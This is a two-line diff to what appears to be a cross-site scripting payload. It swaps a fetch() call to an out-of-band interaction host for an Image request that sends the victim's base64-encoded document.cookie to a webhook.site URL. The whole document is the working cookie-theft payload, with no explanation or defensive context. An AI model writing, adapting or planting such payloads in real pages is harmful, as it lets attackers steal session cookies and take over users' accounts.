@@ -1,1 +1,2 @@
-fetch('https://65ff4eada8070e6bc243gufdxroyyyyyb.oast.pro');
+x = new Image(); x.src = 'https://webhook.site/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?
+data='+btoa(document.cookie);
